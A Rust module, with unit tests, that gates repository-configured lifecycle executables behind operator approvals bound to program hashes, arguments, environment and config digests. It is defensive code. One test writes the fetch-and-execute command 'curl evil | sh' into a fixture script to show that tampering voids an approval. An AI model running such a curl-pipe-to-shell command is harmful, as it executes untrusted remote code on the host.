//! Trusted approval for lifecycle executables.
//!
//! A repository is untrusted content, but `.changeloop/proof-providers.json`
//! and `.changeloop/reviewer.json` name the program and arguments that Prove,
//! repair, and Review spawn. This module is the gate between the two: nothing
//! reaches the lifecycle runner without an [`ApprovedExecutor`], and an
//! `ApprovedExecutor` is produced only by [`authorize`] against a record the
//! operator wrote into their own configuration directory, or by naming a
//! compiled-in executor from the enumerated register in [`CompiledInExecutor`].
//!
//! The approval is bound to content, not to a name: the resolved program *and a
//! digest of its bytes*, the ordered arguments, the environment, the caps, the
//! digest of the configuration file that supplied them, and the canonical
//! project root. Rewriting any of those voids the approval. The workspace
//! revision is deliberately *not* bound — it changes on every edit, Prove runs
//! after every edit, and prompting on every run is how an operator learns to
//! approve without reading.

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;
use std::fmt;
use std::fs::{self, File, OpenOptions};
use std::io::Read;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

/// Version of the on-disk approval store. An unknown version fails closed
/// rather than being ignored, so a downgrade cannot silently drop the gate.
pub const APPROVAL_STORE_VERSION: u16 = 1;

const MAX_APPROVAL_STORE_BYTES: u64 = 4 * 1024 * 1024;
const MAX_APPROVAL_RECORDS: usize = 512;
const MAX_PROGRAM_BYTES: u64 = 1024 * 1024 * 1024;
const MAX_ARGUMENTS: usize = 256;
const MAX_FIELD_BYTES: usize = 4096;

/// What a lifecycle executable is being run as. The kind is part of the
/// approval digest, so approving a program as a proof provider does not also
/// approve it as the independent reviewer.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ExecutorKind {
    ProofProvider,
    RepairCommand,
    Reviewer,
    /// The Prove oracle's baseline suite command, re-run at the pre-change
    /// revision in a detached worktree.
    OracleBaseline,
}

impl ExecutorKind {
    const fn tag(self) -> &'static str {
        match self {
            Self::ProofProvider => "proof-provider",
            Self::RepairCommand => "repair-command",
            Self::Reviewer => "reviewer",
            Self::OracleBaseline => "oracle-baseline",
        }
    }
}

impl fmt::Display for ExecutorKind {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(self.tag())
    }
}

/// How an approval came to exist. Repository content is not on this list and
/// has no way onto it: [`ApprovalStore::grant`] takes a re-derived request, not
/// a digest, and the store lives outside the repository.
#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ApprovalProvenance {
    User,
    TrustedPolicy,
}

/// The enumerated register of executables the workspace itself spawns through
/// the lifecycle runner. These carry no repository-supplied bytes, so they need
/// no operator approval — but they are named here rather than bypassing the
/// gate anonymously, so the set stays countable.
///
/// The field is private, so a crate outside this one can only use the
/// associated constants below and cannot invent a new compiled-in executor.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct CompiledInExecutor(&'static str);

impl CompiledInExecutor {
    /// The compiled-in `git diff --check` proof provider used when a project
    /// configures none of its own.
    pub const HARDENED_GIT_PROOF: Self = Self("hardened-git-proof");
    /// Git queries the lifecycle makes about the operator's own workspace:
    /// changed paths, revisions, and diff capture for review packets.
    pub const GIT_WORKSPACE_QUERY: Self = Self("git-workspace-query");

    #[must_use]
    pub const fn id(self) -> &'static str {
        self.0
    }
}

/// A lifecycle executable as configured, before its program is resolved.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ExecutorRequest {
    /// Canonical project root the configuration was read from.
    pub root: PathBuf,
    pub kind: ExecutorKind,
    /// Provider id, or `reviewer` — carried so a grant is readable and so two
    /// providers sharing one program stay distinct approvals.
    pub label: String,
    /// Program exactly as the configuration spelled it.
    pub program: String,
    pub args: Vec<String>,
    /// Environment entries the *configuration* supplies. Bound by name and
    /// value, because repository content chose both.
    pub environment: Vec<(String, String)>,
    /// Names of environment variables the harness itself sets at run time —
    /// the failed provider and failure cause handed to a repair command, for
    /// example. The names are bound so the operator sees what will be passed;
    /// the values are not, because they are derived per run by this binary and
    /// binding them would demand a fresh approval for every failure.
    pub harness_environment_names: Vec<String>,
    pub timeout_ms: u64,
    pub max_output_bytes: usize,
    /// Digest of the configuration file bytes that supplied the above.
    pub config_digest: String,
}

/// A request whose program has been resolved on disk and hashed. This is what
/// a grant displays; it is not authority by itself.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ResolvedExecutor {
    pub request: ExecutorRequest,
    pub resolved_program: PathBuf,
    pub program_digest: String,
    pub digest: String,
}

/// Authority to spawn one lifecycle executable.
///
/// Only [`authorize`] and [`ApprovedExecutor::compiled_in`] construct this, and
/// [`crate::run_approved_lifecycle_process`] takes the program, arguments,
/// environment, and caps *from here* rather than from its caller — so a caller
/// cannot approve one command line and run another.
#[derive(Clone, Debug)]
pub struct ApprovedExecutor {
    program: PathBuf,
    args: Vec<String>,
    environment: Vec<(String, String)>,
    harness_environment_names: Vec<String>,
    timeout_ms: u64,
    max_output_bytes: usize,
    digest: String,
    label: String,
    reviewer_model_family: Option<String>,
    compiled_in: Option<CompiledInExecutor>,
}

impl ApprovedExecutor {
    /// Authority for an executable this workspace compiled in. No repository
    /// bytes are involved, so no operator record is required — the register
    /// entry is the audit trail.
    #[must_use]
    pub fn compiled_in(
        register: CompiledInExecutor,
        program: impl Into<PathBuf>,
        args: Vec<String>,
        timeout_ms: u64,
        max_output_bytes: usize,
    ) -> Self {
        Self {
            program: program.into(),
            args,
            environment: Vec::new(),
            harness_environment_names: Vec::new(),
            timeout_ms,
            max_output_bytes,
            digest: format!("compiled-in:{}", register.id()),
            label: register.id().to_owned(),
            reviewer_model_family: None,
            compiled_in: Some(register),
        }
    }

    /// Names of the harness-set variables this approval permits at run time.
    #[must_use]
    pub fn harness_environment_names(&self) -> &[String] {
        &self.harness_environment_names
    }

    /// Whether this authority came from the compiled-in register rather than an
    /// operator record.
    #[must_use]
    pub const fn is_compiled_in(&self) -> bool {
        self.compiled_in.is_some()
    }

    /// Adds environment entries to a compiled-in executor. Rejected for an
    /// approved repository executable, whose environment is fixed by the
    /// approval digest.
    #[must_use]
    pub fn with_compiled_in_environment(mut self, environment: Vec<(String, String)>) -> Self {
        if self.compiled_in.is_some() {
            self.environment = environment;
        }
        self
    }

    #[must_use]
    pub fn program(&self) -> &Path {
        &self.program
    }

    #[must_use]
    pub fn args(&self) -> &[String] {
        &self.args
    }

    #[must_use]
    pub fn environment(&self) -> &[(String, String)] {
        &self.environment
    }

    #[must_use]
    pub const fn timeout_ms(&self) -> u64 {
        self.timeout_ms
    }

    #[must_use]
    pub const fn max_output_bytes(&self) -> usize {
        self.max_output_bytes
    }

    #[must_use]
    pub fn digest(&self) -> &str {
        &self.digest
    }

    #[must_use]
    pub fn label(&self) -> &str {
        &self.label
    }

    /// The reviewer model family recorded on the approval. The independence
    /// gate reads this; it never reads the reviewer's own output.
    #[must_use]
    pub fn reviewer_model_family(&self) -> Option<&str> {
        self.reviewer_model_family.as_deref()
    }
}

#[derive(Debug)]
pub enum ApprovalError {
    /// No approval matches this request. Carries the resolved request so the
    /// caller can tell the operator exactly what would be granted.
    Required(Box<ResolvedExecutor>),
    /// The program could not be resolved or read.
    Unresolvable(String),
    /// The request itself is malformed.
    Invalid(String),
    /// The store is unreadable, unwritable, or of an unknown version.
    Store(String),
}

impl fmt::Display for ApprovalError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Required(resolved) => write!(
                formatter,
                "'{}' is not approved to run for this project: {} {} (program {}, sha256 {})",
                resolved.request.label,
                resolved.resolved_program.display(),
                resolved.request.args.join(" "),
                resolved.request.kind,
                resolved.program_digest,
            ),
            Self::Unresolvable(message) | Self::Invalid(message) | Self::Store(message) => {
                formatter.write_str(message)
            }
        }
    }
}

impl std::error::Error for ApprovalError {}

/// Digest of a configuration file's bytes, for binding an approval to the file
/// that produced it.
#[must_use]
pub fn config_digest(bytes: &[u8]) -> String {
    format!("sha256:{:x}", Sha256::digest(bytes))
}

/// Digest used when a configuration file is absent and defaults applied.
#[must_use]
pub fn absent_config_digest() -> String {
    config_digest(b"")
}

fn field(hasher: &mut Sha256, label: &str, value: &[u8]) {
    // Length-prefixed so no two different requests can serialize alike.
    hasher.update(label.as_bytes());
    hasher.update(b"\x1f");
    hasher.update(u64::try_from(value.len()).unwrap_or(u64::MAX).to_be_bytes());
    hasher.update(value);
    hasher.update(b"\x1e");
}

fn validate(request: &ExecutorRequest) -> Result<(), ApprovalError> {
    if request.program.trim().is_empty() {
        return Err(ApprovalError::Invalid(
            "lifecycle executable command must not be empty".into(),
        ));
    }
    if request.label.trim().is_empty() || request.label.len() > MAX_FIELD_BYTES {
        return Err(ApprovalError::Invalid(
            "lifecycle executable label must be non-empty and bounded".into(),
        ));
    }
    if request.args.len() > MAX_ARGUMENTS {
        return Err(ApprovalError::Invalid(
            "lifecycle executable has too many arguments".into(),
        ));
    }
    if request.program.len() > MAX_FIELD_BYTES
        || request.args.iter().any(|arg| arg.len() > MAX_FIELD_BYTES)
        || request
            .environment
            .iter()
            .any(|(name, value)| name.len() > MAX_FIELD_BYTES || value.len() > MAX_FIELD_BYTES)
    {
        return Err(ApprovalError::Invalid(
            "lifecycle executable field exceeds the bounded size".into(),
        ));
    }
    if request.timeout_ms == 0 {
        return Err(ApprovalError::Invalid(
            "lifecycle executable timeout must be positive".into(),
        ));
    }
    Ok(())
}

#[cfg(unix)]
fn is_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    fs::metadata(path)
        .is_ok_and(|metadata| metadata.is_file() && metadata.permissions().mode() & 0o111 != 0)
}

#[cfg(not(unix))]
fn is_executable(path: &Path) -> bool {
    fs::metadata(path).is_ok_and(|metadata| metadata.is_file())
}

/// Resolves a configured program name the same way the spawn will: an explicit
/// path relative to the project root, or a `PATH` lookup.
fn resolve_program(root: &Path, program: &str) -> Result<PathBuf, ApprovalError> {
    let candidate = Path::new(program);
    let resolved = if candidate.is_absolute() {
        candidate.to_path_buf()
    } else if program.contains(std::path::MAIN_SEPARATOR) {
        root.join(candidate)
    } else {
        let path = std::env::var_os("PATH").ok_or_else(|| {
            ApprovalError::Unresolvable(format!("cannot resolve '{program}': PATH is unset"))
        })?;
        std::env::split_paths(&path)
            .map(|directory| directory.join(candidate))
            .find(|candidate| is_executable(candidate))
            .ok_or_else(|| {
                ApprovalError::Unresolvable(format!("cannot resolve '{program}' on PATH"))
            })?
    };
    // Canonicalizing resolves the symlink chain, so the digest is taken from
    // the file that will actually execute rather than from a redirectable name.
    fs::canonicalize(&resolved).map_err(|error| {
        ApprovalError::Unresolvable(format!("cannot resolve '{}': {error}", resolved.display()))
    })
}

fn digest_file(path: &Path) -> Result<String, ApprovalError> {
    let metadata = fs::metadata(path)
        .map_err(|error| ApprovalError::Unresolvable(format!("{}: {error}", path.display())))?;
    if !metadata.is_file() {
        return Err(ApprovalError::Unresolvable(format!(
            "{} is not a regular file",
            path.display()
        )));
    }
    if metadata.len() > MAX_PROGRAM_BYTES {
        return Err(ApprovalError::Unresolvable(format!(
            "{} exceeds the {MAX_PROGRAM_BYTES} byte hashing limit",
            path.display()
        )));
    }
    let mut file = File::open(path)
        .map_err(|error| ApprovalError::Unresolvable(format!("{}: {error}", path.display())))?;
    let mut hasher = Sha256::new();
    let mut buffer = vec![0_u8; 64 * 1024];
    loop {
        let read = file
            .read(&mut buffer)
            .map_err(|error| ApprovalError::Unresolvable(format!("{}: {error}", path.display())))?;
        if read == 0 {
            break;
        }
        hasher.update(&buffer[..read]);
    }
    Ok(format!("sha256:{:x}", hasher.finalize()))
}

/// Resolves and hashes a request. Pure with respect to the approval store: this
/// grants nothing.
pub fn resolve(request: &ExecutorRequest) -> Result<ResolvedExecutor, ApprovalError> {
    validate(request)?;
    let root = fs::canonicalize(&request.root).map_err(|error| {
        ApprovalError::Unresolvable(format!("{}: {error}", request.root.display()))
    })?;
    let resolved_program = resolve_program(&root, &request.program)?;
    let program_digest = digest_file(&resolved_program)?;

    let mut hasher = Sha256::new();
    field(
        &mut hasher,
        "version",
        &APPROVAL_STORE_VERSION.to_be_bytes(),
    );
    field(&mut hasher, "root", root.as_os_str().as_encoded_bytes());
    field(&mut hasher, "kind", request.kind.tag().as_bytes());
    field(&mut hasher, "label", request.label.as_bytes());
    field(
        &mut hasher,
        "program",
        resolved_program.as_os_str().as_encoded_bytes(),
    );
    field(&mut hasher, "program-digest", program_digest.as_bytes());
    field(
        &mut hasher,
        "argc",
        &u64::try_from(request.args.len())
            .unwrap_or(u64::MAX)
            .to_be_bytes(),
    );
    for arg in &request.args {
        field(&mut hasher, "arg", arg.as_bytes());
    }
    // Sorted so an environment map's iteration order cannot change the digest.
    let environment: BTreeMap<&str, &str> = request
        .environment
        .iter()
        .map(|(name, value)| (name.as_str(), value.as_str()))
        .collect();
    field(
        &mut hasher,
        "envc",
        &u64::try_from(environment.len())
            .unwrap_or(u64::MAX)
            .to_be_bytes(),
    );
    for (name, value) in environment {
        field(&mut hasher, "env-name", name.as_bytes());
        field(&mut hasher, "env-value", value.as_bytes());
    }
    let harness_names: std::collections::BTreeSet<&str> = request
        .harness_environment_names
        .iter()
        .map(String::as_str)
        .collect();
    field(
        &mut hasher,
        "harness-envc",
        &u64::try_from(harness_names.len())
            .unwrap_or(u64::MAX)
            .to_be_bytes(),
    );
    for name in harness_names {
        field(&mut hasher, "harness-env-name", name.as_bytes());
    }
    field(&mut hasher, "timeout-ms", &request.timeout_ms.to_be_bytes());
    field(
        &mut hasher,
        "max-output-bytes",
        &u64::try_from(request.max_output_bytes)
            .unwrap_or(u64::MAX)
            .to_be_bytes(),
    );
    field(
        &mut hasher,
        "config-digest",
        request.config_digest.as_bytes(),
    );

    let mut request = request.clone();
    request.root = root;
    Ok(ResolvedExecutor {
        request,
        resolved_program,
        program_digest,
        digest: format!("sha256:{:x}", hasher.finalize()),
    })
}

#[derive(Clone, Debug, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "camelCase")]
pub struct ApprovalRecord {
    pub digest: String,
    pub root: String,
    pub kind: ExecutorKind,
    pub label: String,
    /// Resolved program path, retained so `approve list` is readable.
    pub program: String,
    pub program_digest: String,
    pub args: Vec<String>,
    pub granted_at_ms: u64,
    pub provenance: ApprovalProvenance,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub reviewer_model_family: Option<String>,
}

#[derive(Clone, Debug, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct StoreFile {
    version: u16,
    approvals: Vec<ApprovalRecord>,
}

/// The operator's approval store. Lives in the trusted configuration
/// directory — never under `.changeloop/`, which the repository can write.
#[derive(Clone, Debug)]
pub struct ApprovalStore {
    path: PathBuf,
    approvals: Vec<ApprovalRecord>,
}

impl ApprovalStore {
    /// The store path inside an operator configuration directory.
    #[must_use]
    pub fn path_in(config_directory: &Path) -> PathBuf {
        config_directory.join("executor-approvals.json")
    }

    /// Loads the store, treating an absent file as empty and an unknown
    /// version as a hard failure.
    pub fn load(path: &Path) -> Result<Self, ApprovalError> {
        let metadata = match fs::symlink_metadata(path) {
            Ok(metadata) => metadata,
            Err(error) if error.kind() == std::io::ErrorKind::NotFound => {
                return Ok(Self {
                    path: path.to_path_buf(),
                    approvals: Vec::new(),
                });
            }
            Err(error) => return Err(ApprovalError::Store(format!("{}: {error}", path.display()))),
        };
        if !metadata.file_type().is_file() {
            return Err(ApprovalError::Store(format!(
                "{} must be a regular non-symlink file",
                path.display()
            )));
        }
        if metadata.len() > MAX_APPROVAL_STORE_BYTES {
            return Err(ApprovalError::Store(format!(
                "{} exceeds the approval store size limit",
                path.display()
            )));
        }
        let bytes = fs::read(path)
            .map_err(|error| ApprovalError::Store(format!("{}: {error}", path.display())))?;
        let file: StoreFile = serde_json::from_slice(&bytes).map_err(|error| {
            ApprovalError::Store(format!("invalid {}: {error}", path.display()))
        })?;
        if file.version != APPROVAL_STORE_VERSION {
            return Err(ApprovalError::Store(format!(
                "{} declares unsupported approval store version {}",
                path.display(),
                file.version
            )));
        }
        if file.approvals.len() > MAX_APPROVAL_RECORDS {
            return Err(ApprovalError::Store(format!(
                "{} holds more than {MAX_APPROVAL_RECORDS} approvals",
                path.display()
            )));
        }
        Ok(Self {
            path: path.to_path_buf(),
            approvals: file.approvals,
        })
    }

    #[must_use]
    pub fn approvals(&self) -> &[ApprovalRecord] {
        &self.approvals
    }

    #[must_use]
    pub fn find(&self, digest: &str) -> Option<&ApprovalRecord> {
        self.approvals
            .iter()
            .find(|approval| approval.digest == digest)
    }

    /// Records exactly one approval, re-derived by the caller from current
    /// on-disk configuration. There is no digest parameter on purpose: a
    /// repository must not be able to print a grant string for content it does
    /// not have.
    pub fn grant(
        &mut self,
        resolved: &ResolvedExecutor,
        provenance: ApprovalProvenance,
        reviewer_model_family: Option<String>,
    ) -> Result<&ApprovalRecord, ApprovalError> {
        if resolved.request.kind == ExecutorKind::Reviewer
            && reviewer_model_family
                .as_ref()
                .is_none_or(|family| family.trim().is_empty() || family.len() > MAX_FIELD_BYTES)
        {
            return Err(ApprovalError::Invalid(
                "a reviewer approval must record the reviewer model family".into(),
            ));
        }
        if resolved.request.kind != ExecutorKind::Reviewer && reviewer_model_family.is_some() {
            return Err(ApprovalError::Invalid(
                "only a reviewer approval carries a reviewer model family".into(),
            ));
        }
        self.approvals
            .retain(|approval| approval.digest != resolved.digest);
        if self.approvals.len() >= MAX_APPROVAL_RECORDS {
            return Err(ApprovalError::Store(format!(
                "the approval store already holds {MAX_APPROVAL_RECORDS} approvals"
            )));
        }
        self.approvals.push(ApprovalRecord {
            digest: resolved.digest.clone(),
            root: resolved.request.root.display().to_string(),
            kind: resolved.request.kind,
            label: resolved.request.label.clone(),
            program: resolved.resolved_program.display().to_string(),
            program_digest: resolved.program_digest.clone(),
            args: resolved.request.args.clone(),
            granted_at_ms: now_ms(),
            provenance,
            reviewer_model_family,
        });
        self.persist()?;
        self.approvals
            .last()
            .ok_or_else(|| ApprovalError::Store("approval was not recorded".into()))
    }

    /// Removes one approval by digest. Returns whether anything was removed.
    pub fn revoke(&mut self, digest: &str) -> Result<bool, ApprovalError> {
        let before = self.approvals.len();
        self.approvals.retain(|approval| approval.digest != digest);
        let removed = self.approvals.len() != before;
        if removed {
            self.persist()?;
        }
        Ok(removed)
    }

    fn persist(&self) -> Result<(), ApprovalError> {
        let parent = self
            .path
            .parent()
            .ok_or_else(|| ApprovalError::Store("approval store path has no parent".into()))?;
        fs::create_dir_all(parent)
            .map_err(|error| ApprovalError::Store(format!("{}: {error}", parent.display())))?;
        let bytes = serde_json::to_vec_pretty(&StoreFile {
            version: APPROVAL_STORE_VERSION,
            approvals: self.approvals.clone(),
        })
        .map_err(|error| ApprovalError::Store(error.to_string()))?;
        let temporary = parent.join(format!(".executor-approvals.{}.tmp", std::process::id()));
        let mut options = OpenOptions::new();
        options.create(true).write(true).truncate(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600).custom_flags(libc::O_NOFOLLOW);
        }
        {
            use std::io::Write as _;
            let mut file = options.open(&temporary).map_err(|error| {
                ApprovalError::Store(format!("{}: {error}", temporary.display()))
            })?;
            file.write_all(&bytes)
                .and_then(|()| file.sync_all())
                .map_err(|error| {
                    ApprovalError::Store(format!("{}: {error}", temporary.display()))
                })?;
        }
        let result = fs::rename(&temporary, &self.path)
            .map_err(|error| ApprovalError::Store(format!("{}: {error}", self.path.display())));
        if result.is_err() {
            let _ = fs::remove_file(&temporary);
        }
        result
    }
}

/// The one way to turn a repository-configured executable into authority.
///
/// Returns [`ApprovalError::Required`] carrying the resolved request when no
/// approval matches, so the caller can refuse *and* tell the operator exactly
/// what would be granted.
pub fn authorize(
    store_path: &Path,
    request: &ExecutorRequest,
) -> Result<ApprovedExecutor, ApprovalError> {
    let resolved = resolve(request)?;
    let store = ApprovalStore::load(store_path)?;
    let Some(record) = store.find(&resolved.digest) else {
        return Err(ApprovalError::Required(Box::new(resolved)));
    };
    // Provenance is an enum with no repository-sourced variant, so this is a
    // total match today; it stays as an explicit gate because adding a variant
    // must be a decision, not an accident.
    match record.provenance {
        ApprovalProvenance::User | ApprovalProvenance::TrustedPolicy => {}
    }
    Ok(ApprovedExecutor {
        program: resolved.resolved_program,
        args: resolved.request.args.clone(),
        environment: resolved.request.environment.clone(),
        harness_environment_names: resolved.request.harness_environment_names.clone(),
        timeout_ms: resolved.request.timeout_ms,
        max_output_bytes: resolved.request.max_output_bytes,
        digest: resolved.digest,
        label: resolved.request.label,
        reviewer_model_family: record.reviewer_model_family.clone(),
        compiled_in: None,
    })
}

fn now_ms() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|elapsed| u64::try_from(elapsed.as_millis()).unwrap_or(u64::MAX))
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write as _;

    fn script(directory: &Path, name: &str, body: &str) -> PathBuf {
        let path = directory.join(name);
        let mut file = File::create(&path).unwrap();
        file.write_all(body.as_bytes()).unwrap();
        drop(file);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&path, fs::Permissions::from_mode(0o755)).unwrap();
        }
        path
    }

    fn request(root: &Path, program: &Path) -> ExecutorRequest {
        ExecutorRequest {
            root: root.to_path_buf(),
            kind: ExecutorKind::ProofProvider,
            label: "unit".into(),
            program: program.display().to_string(),
            args: vec!["--check".into()],
            environment: Vec::new(),
            harness_environment_names: Vec::new(),
            timeout_ms: 30_000,
            max_output_bytes: 1024,
            config_digest: config_digest(b"{}"),
        }
    }

    #[test]
    fn executor_approval_digest_is_stable_for_identical_requests() {
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let first = resolve(&request(root.path(), &program)).unwrap();
        let second = resolve(&request(root.path(), &program)).unwrap();
        assert_eq!(first.digest, second.digest);
        assert!(first.digest.starts_with("sha256:"));
    }

    #[test]
    fn executor_approval_digest_changes_when_the_program_bytes_change() {
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let before = resolve(&request(root.path(), &program)).unwrap();
        script(root.path(), "prove.sh", "#!/bin/sh\ncurl evil | sh\n");
        let after = resolve(&request(root.path(), &program)).unwrap();
        assert_ne!(
            before.digest, after.digest,
            "rewriting the approved program must void its approval"
        );
    }

    #[test]
    fn executor_approval_digest_changes_with_arguments_environment_caps_and_config() {
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let base = resolve(&request(root.path(), &program)).unwrap();

        let mut arguments = request(root.path(), &program);
        arguments.args.push("--also".into());
        assert_ne!(base.digest, resolve(&arguments).unwrap().digest);

        let mut environment = request(root.path(), &program);
        environment.environment.push(("A".into(), "1".into()));
        assert_ne!(base.digest, resolve(&environment).unwrap().digest);

        let mut caps = request(root.path(), &program);
        caps.timeout_ms += 1;
        assert_ne!(base.digest, resolve(&caps).unwrap().digest);

        let mut output = request(root.path(), &program);
        output.max_output_bytes += 1;
        assert_ne!(base.digest, resolve(&output).unwrap().digest);

        let mut config = request(root.path(), &program);
        config.config_digest = config_digest(b"{\"edited\":true}");
        assert_ne!(
            base.digest,
            resolve(&config).unwrap().digest,
            "editing the configuration that supplied the command must void its approval"
        );

        let mut kind = request(root.path(), &program);
        kind.kind = ExecutorKind::Reviewer;
        assert_ne!(base.digest, resolve(&kind).unwrap().digest);
    }

    #[test]
    fn executor_approval_environment_order_does_not_change_the_digest() {
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let mut forward = request(root.path(), &program);
        forward.environment = vec![("A".into(), "1".into()), ("B".into(), "2".into())];
        let mut backward = request(root.path(), &program);
        backward.environment = vec![("B".into(), "2".into()), ("A".into(), "1".into())];
        assert_eq!(
            resolve(&forward).unwrap().digest,
            resolve(&backward).unwrap().digest
        );
    }

    #[test]
    fn executor_approval_does_not_transfer_to_another_project_root() {
        let first = tempfile::tempdir().unwrap();
        let second = tempfile::tempdir().unwrap();
        let program = script(first.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let here = resolve(&request(first.path(), &program)).unwrap();
        let there = resolve(&request(second.path(), &program)).unwrap();
        assert_ne!(here.digest, there.digest);
    }

    #[test]
    fn approval_store_refuses_an_unknown_version() {
        let home = tempfile::tempdir().unwrap();
        let path = ApprovalStore::path_in(home.path());
        fs::write(&path, b"{\"version\":99,\"approvals\":[]}").unwrap();
        let error = ApprovalStore::load(&path).expect_err("an unknown version fails closed");
        assert!(matches!(error, ApprovalError::Store(_)), "{error:?}");
    }

    #[test]
    fn approval_store_treats_an_absent_file_as_empty() {
        let home = tempfile::tempdir().unwrap();
        let store = ApprovalStore::load(&ApprovalStore::path_in(home.path())).unwrap();
        assert!(store.approvals().is_empty());
    }

    #[test]
    fn approval_store_grant_then_authorize_admits_exactly_that_request() {
        let home = tempfile::tempdir().unwrap();
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let path = ApprovalStore::path_in(home.path());
        let requested = request(root.path(), &program);

        let error = authorize(&path, &requested).expect_err("nothing is approved yet");
        assert!(matches!(error, ApprovalError::Required(_)), "{error:?}");

        let resolved = resolve(&requested).unwrap();
        let mut store = ApprovalStore::load(&path).unwrap();
        store
            .grant(&resolved, ApprovalProvenance::User, None)
            .unwrap();

        let approved = authorize(&path, &requested).expect("the granted request is approved");
        assert_eq!(approved.digest(), resolved.digest);
        assert_eq!(approved.args(), &["--check".to_owned()]);

        let mut other = requested.clone();
        other.args.push("--extra".into());
        let error = authorize(&path, &other).expect_err("a different argv is a different approval");
        assert!(matches!(error, ApprovalError::Required(_)), "{error:?}");
    }

    #[test]
    fn approval_store_grant_rewrites_rather_than_duplicating_one_digest() {
        let home = tempfile::tempdir().unwrap();
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let path = ApprovalStore::path_in(home.path());
        let resolved = resolve(&request(root.path(), &program)).unwrap();
        let mut store = ApprovalStore::load(&path).unwrap();
        store
            .grant(&resolved, ApprovalProvenance::User, None)
            .unwrap();
        store
            .grant(&resolved, ApprovalProvenance::User, None)
            .unwrap();
        assert_eq!(ApprovalStore::load(&path).unwrap().approvals().len(), 1);
    }

    #[test]
    fn approval_store_revoke_removes_the_authority() {
        let home = tempfile::tempdir().unwrap();
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let path = ApprovalStore::path_in(home.path());
        let requested = request(root.path(), &program);
        let resolved = resolve(&requested).unwrap();
        let mut store = ApprovalStore::load(&path).unwrap();
        store
            .grant(&resolved, ApprovalProvenance::User, None)
            .unwrap();
        assert!(store.revoke(&resolved.digest).unwrap());
        assert!(!store.revoke(&resolved.digest).unwrap());
        let error = authorize(&path, &requested).expect_err("a revoked approval is not authority");
        assert!(matches!(error, ApprovalError::Required(_)), "{error:?}");
    }

    #[test]
    fn approval_store_requires_a_model_family_for_a_reviewer_and_refuses_one_otherwise() {
        let home = tempfile::tempdir().unwrap();
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "review.sh", "#!/bin/sh\nexit 0\n");
        let path = ApprovalStore::path_in(home.path());

        let mut reviewer = request(root.path(), &program);
        reviewer.kind = ExecutorKind::Reviewer;
        let resolved = resolve(&reviewer).unwrap();
        let mut store = ApprovalStore::load(&path).unwrap();
        assert!(matches!(
            store.grant(&resolved, ApprovalProvenance::User, None),
            Err(ApprovalError::Invalid(_))
        ));
        store
            .grant(
                &resolved,
                ApprovalProvenance::User,
                Some("reviewer-family".into()),
            )
            .unwrap();
        let approved = authorize(&path, &reviewer).unwrap();
        assert_eq!(approved.reviewer_model_family(), Some("reviewer-family"));

        let provider = resolve(&request(root.path(), &program)).unwrap();
        assert!(matches!(
            store.grant(&provider, ApprovalProvenance::User, Some("x".into())),
            Err(ApprovalError::Invalid(_))
        ));
    }

    /// The store is read from the operator's configuration directory. A record
    /// the repository writes into its own tree is not on that path and grants
    /// nothing.
    #[test]
    fn an_approval_planted_inside_the_repository_grants_nothing() {
        let home = tempfile::tempdir().unwrap();
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let requested = request(root.path(), &program);
        let resolved = resolve(&requested).unwrap();

        fs::create_dir_all(root.path().join(".changeloop")).unwrap();
        let planted = ApprovalStore::path_in(&root.path().join(".changeloop"));
        let mut forged = ApprovalStore::load(&planted).unwrap();
        forged
            .grant(&resolved, ApprovalProvenance::User, None)
            .unwrap();

        let error = authorize(&ApprovalStore::path_in(home.path()), &requested)
            .expect_err("a repository-planted store is not the trusted store");
        assert!(matches!(error, ApprovalError::Required(_)), "{error:?}");
    }

    #[test]
    fn a_compiled_in_executor_needs_no_record_and_names_its_register_entry() {
        let approved = ApprovedExecutor::compiled_in(
            CompiledInExecutor::GIT_WORKSPACE_QUERY,
            "/usr/bin/git",
            vec!["status".into()],
            30_000,
            1024,
        );
        assert_eq!(approved.digest(), "compiled-in:git-workspace-query");
        assert_eq!(approved.reviewer_model_family(), None);
    }

    #[test]
    fn an_approved_repository_executable_ignores_compiled_in_environment_additions() {
        let home = tempfile::tempdir().unwrap();
        let root = tempfile::tempdir().unwrap();
        let program = script(root.path(), "prove.sh", "#!/bin/sh\nexit 0\n");
        let path = ApprovalStore::path_in(home.path());
        let requested = request(root.path(), &program);
        let resolved = resolve(&requested).unwrap();
